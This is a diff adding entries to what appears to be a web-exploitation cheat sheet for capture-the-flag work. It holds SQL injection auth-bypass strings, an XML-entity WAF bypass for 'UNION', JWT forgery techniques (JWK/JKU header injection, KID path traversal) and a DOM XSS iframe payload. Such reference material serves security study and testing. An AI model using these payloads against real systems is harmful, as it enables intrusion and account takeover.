@@ -47,7 +47,9 @@ username=\&password= OR 1=1--  # Backslash escape quote bypass
 0x6d656f77                     # Hex encoding for 'meow' (bypass quotes)
 ```
 
-See [server-side.md](server-side.md) for second-order SQLi, LIKE brute-force, SQLi→SSTI chains.
+XML entity encoding: `&#x55;&#x4e;&#x49;&#x4f;&#x4e;` → `UNION` after XML parser decodes, bypasses WAF keyword filters.
+
+See [server-side.md](server-side.md) for second-order SQLi, LIKE brute-force, SQLi→SSTI chains, XML entity WAF bypass.
 
 ## XSS Quick Reference
 
@@ -80,6 +82,10 @@ See [client-side.md](client-side.md) for DOMPurify bypass, cache poisoning, CSPT
 3. Weak secret — brute force with hashcat/flask-unsign
 4. Key exposure — check `/api/getPublicKey`, `.env`, `/debug/config`
 5. Balance replay — save JWT, spend, replay old JWT, return items for profit
+6. Unverified signature — modify payload, keep original signature
+7. JWK header injection — embed attacker public key in token header
+8. JKU header injection — point to attacker-controlled JWKS URL
+9. KID path traversal — `../../../dev/null` for empty key, or SQL injection in KID
 
 See [auth-and-access.md](auth-and-access.md) for full JWT attacks and session manipulation.
 
@@ -216,6 +222,10 @@ Host malicious DTD externally to bypass upload keyword filters. See [server-side
 ## JSFuck Decoding
 
 Remove trailing `()()`, eval in Node.js, `.toString()` reveals original code. See [client-side.md](client-side.md#jsfuck-decoding).
+
+## DOM XSS via jQuery Hashchange (Crypto-Cat)
+
+`$(location.hash)` + `hashchange` event → XSS via iframe: `<iframe src="https://target/#" onload="this.src+='<img src=x onerror=print()>'">`. See [client-side.md](client-side.md#dom-xss-via-jquery-hashchange-crypto-cat).
 
 ## Shadow DOM XSS
 
